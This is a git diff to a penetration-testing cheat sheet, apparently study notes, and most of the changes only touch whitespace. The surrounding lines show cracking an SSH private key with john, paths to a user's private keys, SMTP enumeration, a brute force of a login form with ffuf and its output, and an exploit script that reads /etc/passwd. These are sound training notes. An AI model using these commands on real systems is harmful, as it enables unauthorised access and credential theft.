@@ -89,20 +89,17 @@ chmod 600 id_rsa
 ssh mario@172.16.138.14 -i id_rsa
 ````
 ##### Cracking Private key
-
 ````
 ssh2john id_ecdsa > id_ecdsa.hash
 john --wordlist=/usr/share/wordlists/rockyou.txt id_ecdsa.hash
 fireball         (id_ecdsa)
 ````
 ##### Path to keys
-
 ````
 /etc/ssh/*pub #Use this to find the type of key
 
 ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBK6SiUV5zqxqNJ9a/p9l+VpxxqiXnYri40OjXMExS/tP0EbTAEpojn4uXKOgR3oEaMmQVmI9QLPTehCFLNJ3iJo= root@web01
 `````
-
 `````
 /home/anita/.ssh/id_ecdsa.pub #Use this to confirm the above exists
 /home/anita/.ssh/id_ecdsa #Use this to confirm the private key exists
@@ -116,6 +113,7 @@ telnet -l james 10.2.2.23
 ````
 nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25
 ````
+
 ````
 nc -nv $IP 25
 telnet $IP 25
@@ -174,6 +172,7 @@ Database files such as .mdb, .sqlite, .db, and .sql files.
 ````
 ffuf -c -request request.txt -request-proto http -mode clusterbomb -fw 1 -w /usr/share/wordlists/rockyou.txt:FUZZ
 ````
+
 ````
 POST /index.php HTTP/1.1
 
@@ -205,6 +204,7 @@ Upgrade-Insecure-Requests: 1
 
 username=admin&password=FUZZ&submit=Log+In
 ````
+
 ````
 [Status: 302, Size: 63, Words: 10, Lines: 1, Duration: 165ms]
     * FUZZ: asdfghjkl;'
@@ -212,9 +212,11 @@ username=admin&password=FUZZ&submit=Log+In
 [Status: 302, Size: 63, Words: 10, Lines: 1, Duration: 172ms]
     * FUZZ: asdfghjkl;\\'
 ````
+
 ````
 https://cybersecnerds.com/ffuf-everything-you-need-to-know/
 ````
+
 ##### CMS 
 ###### WP Scan
 ````
@@ -261,11 +263,6 @@ CVE-2018-18619 https://www.exploit-db.com/exploits/45853 Advanced Comment System
 In this case we were able to attack a box based on its apache server version.
 Its important we remember that these are valid initial footholds and we try them.
 ````
-
-
-![image](https://user-images.githubusercontent.com/127046919/235004773-e29fa522-94c2-415c-954d-a006c3f0f215.png)
-
-
 ````
 /exploit.sh targets.txt /etc/passwd           
 192.168.138.245:8000
